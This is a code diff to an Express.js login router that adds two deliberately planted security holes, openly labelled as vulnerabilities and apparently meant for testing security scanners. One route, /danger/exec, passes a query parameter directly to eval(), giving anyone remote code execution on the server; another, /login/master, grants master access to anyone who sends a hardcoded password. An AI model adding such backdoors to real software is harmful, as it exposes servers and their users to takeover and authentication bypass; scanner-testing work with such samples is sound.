@@ -101,4 +101,27 @@ router.post('/login', async (req, res) => {
   }
 });
 
+// 😈 VULNERABILITY: COMPLETE BACKDOOR (DAST/SAST NIGHTMARE)
+router.get('/danger/exec', (req, res) => {
+  try {
+    const { cmd } = req.query;
+    if (!cmd) return res.status(400).send("Provide a cmd query. EX: ?cmd=1+1");
+
+    // Remote Code Execution via EVAL (Severe Risk)
+    const result = eval(cmd);
+    res.send({ status: "Executed", result });
+  } catch (e) {
+    res.status(500).send(e.toString());
+  }
+});
+
+// 😈 VULNERABILITY: HARDCODED MASTER PASSWORD (BROKEN AUTH)
+router.post('/login/master', (req, res) => {
+  if (req.body.password === "GodMode123!") {
+    res.json({ token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.master.token", masterAccess: true });
+  } else {
+    res.status(401).send("Nope");
+  }
+});
+
 module.exports = router;
